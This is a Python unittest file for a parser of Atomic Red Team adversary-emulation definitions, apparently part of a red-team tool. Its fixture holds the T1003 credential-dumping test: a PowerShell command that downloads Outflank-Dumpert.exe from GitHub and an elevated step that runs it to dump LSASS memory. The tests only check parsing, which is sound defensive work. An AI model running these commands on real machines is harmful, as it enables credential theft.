from red_raccoon.integrations.atomic_red_team.types import Dependency, InputArgument, TestSuite, TestCase

import red_raccoon.integrations.atomic_red_team.parsers as parsers
import red_raccoon.integrations.atomic_red_team.types as types

import unittest
import unittest.mock

TECHNIQUE_ID = 'T1003'
TECHNIQUE_NAME = 'Credential Dumping'

TEST_CASE = {
    "auto_generated_guid": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
    "dependencies": [
        {
            "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
            "get_prereq_command": "New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null"
                                  "\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/"
                                  "5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/"
                                  "Outflank-Dumpert.exe\" -OutFile #{dumpert_exe}\n",
            "prereq_command": "if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}\n"
        }
    ],
    "dependency_executor_name": "powershell",
    "description": "...",
    "executor": {
        "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n",
        "command": "#{dumpert_exe}\n",
        "elevation_required": True,
        "name": "command_prompt"
    },
    "input_arguments": {
        "dumpert_exe": {
            "default": "PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe",
            "description": "Path of Dumpert executable",
            "type": "Path"
        }
    },
    "name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
    "supported_platforms": [
        "windows"
    ]
}

TEST_SUITE = {
    'atomic_tests': [
        TEST_CASE,
    ],
    'attack_technique': TECHNIQUE_ID,
    'display_name': TECHNIQUE_NAME,
}


class HelperTestCases(unittest.TestCase):
    def test_interpolate_command_arguments(self):
        for template, input_arguments, expected in [
            ['#{exe}', {}, '#{exe}'],
            ['#{exe}', None, '#{exe}'],
            ['#{exe}', {'exe': 'C:\\Windows\\System32\\calc.exe'}, 'C:\\Windows\\System32\\calc.exe'],
            ['EXECUTE #{exe}', {'exe': 'C:\\Windows\\System32\\calc.exe'}, 'EXECUTE C:\\Windows\\System32\\calc.exe'],
        ]:
            with self.subTest('{}:{}'.format(template, input_arguments)):
                result = types.interpolate_arguments(template, input_arguments)
                self.assertEqual(expected, result)


class DependencyTestCases(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        data = TEST_CASE['dependencies'][0]
        cls.dependency = parsers.parse_dependency(data)
        cls.input_arguments = {
            'dumpert_exe': '$HOME\\atomic-red-team\\T1003\\bin\\Outflank-Dumpert.exe'
        }

    def test_get_description(self):
        expected = 'Dumpert executable must exist on disk at specified location ($HOME\\atomic-red-team\\T1003\\bin\\' \
                   'Outflank-Dumpert.exe)'
        result = self.dependency.get_description(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)

    def test_get_evaluation_command(self):
        expected = 'if (Test-Path $HOME\\atomic-red-team\\T1003\\bin\\Outflank-Dumpert.exe) {exit 0} else {exit 1}'
        result = self.dependency.get_evaluation_command(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)

    def test_get_resolution_command(self):
        expected = 'New-Item -ItemType Directory (Split-Path $HOME\\atomic-red-team\\T1003\\bin\\Outflank-Dumpert.exe' \
                   ') -Force | Out-Null\nInvoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69' \
                   '618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile $HOME\\atomic-red-team' \
                   '\\T1003\\bin\\Outflank-Dumpert.exe'
        result = self.dependency.get_resolution_command(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)

    def test_get_commands(self):
        expected = [
            self.dependency.get_evaluation_command(self.input_arguments),
            self.dependency.get_resolution_command(self.input_arguments),
        ]
        result = self.dependency.get_commands(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)


class TestCaseTestCases(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_case = parsers.parse_test_case(
            data=TEST_CASE,
            technique_id=TECHNIQUE_ID,
            technique_name=TECHNIQUE_NAME,
        )
        cls.input_arguments = {
            'dumpert_exe': '$HOME\\atomic-red-team\\T1003\\bin\\Outflank-Dumpert.exe'
        }

    def test_get_command(self):
        expected = '$HOME\\atomic-red-team\\T1003\\bin\\Outflank-Dumpert.exe'
        result = self.test_case.get_command(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)

    def test_get_cleanup_command(self):
        expected = 'del C:\\windows\\temp\\dumpert.dmp >nul 2> nul'
        result = self.test_case.get_cleanup_command(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)

    def test_get_commands(self):
        expected = [
            self.test_case.get_command(input_arguments=self.input_arguments),
            self.test_case.get_cleanup_command(input_arguments=self.input_arguments),
        ]
        result = self.test_case.get_commands(input_arguments=self.input_arguments)
        self.assertEqual(expected, result)
